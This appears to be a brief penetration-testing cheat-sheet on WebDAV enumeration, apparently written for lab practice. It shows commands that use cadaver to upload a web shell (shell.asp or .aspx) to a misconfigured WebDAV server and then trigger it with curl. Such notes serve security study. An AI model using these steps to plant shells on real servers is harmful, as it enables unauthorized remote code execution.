# WebDAV

## Overview

WebDAV (Web Distributed Authoring and Versioning) is an extension to HTTP that allows users to remotely manage files on a web server. During enumeration, it is important to determine whether WebDAV is enabled and what methods are permitted. Misconfigured WebDAV services may allow unauthenticated or weakly authenticated users to upload, modify, or delete files, potentially leading to web shell deployment or remote code execution.

---
Connect to WebDAV server and send malicious file to shell

```shell
cadaver http://<IP>/webdav
put <shell.asp>
```
- might need to drop /webdav to connect
- also try .aspx

```shell
curl -u "<user>:<password>" http://<IP>/webdav/shell.asp
```
- Or navigate to it in web browser

Working example in Hutch-Windows
